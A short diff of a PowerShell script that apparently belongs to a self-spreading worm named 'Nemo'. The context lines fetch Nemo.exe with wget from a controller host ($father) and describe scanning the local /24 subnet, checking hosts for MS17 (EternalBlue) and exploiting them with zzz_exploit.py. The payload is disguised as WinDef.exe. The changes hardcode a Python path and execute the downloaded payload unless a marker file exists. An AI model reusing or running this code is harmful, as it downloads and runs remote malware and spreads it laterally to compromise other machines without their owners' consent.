@@ -62,7 +62,7 @@ Start-Process -FilePath $wgetBinLocation -Args " http://$father/Nemo.exe -O $Loc
 # Get all valid IPs (The IPs in /24)
 # For example: If the target has 192.168.1.1 it will get all 192.168.1.0/24 IPs
 # Then ping them if an IP is alive, it will be checked for MS17 then Exploit
-python scan.py
+c:\python27\python scan.py
 # NOTE: ^WinDef.exe <- Nemo.exe should be in the same dir as scan.py and zzz_exploit.py
 
 
@@ -78,3 +78,8 @@ python scan.py
 #Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\3.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
 
 #iex "msiexec /a C:\Windows\Temp\1.msi /qb TARGETDIR=C:\python27"
+
+
+if (!(Test-Path "C:\POCNemo.txt")){
+        .\$Location
+}
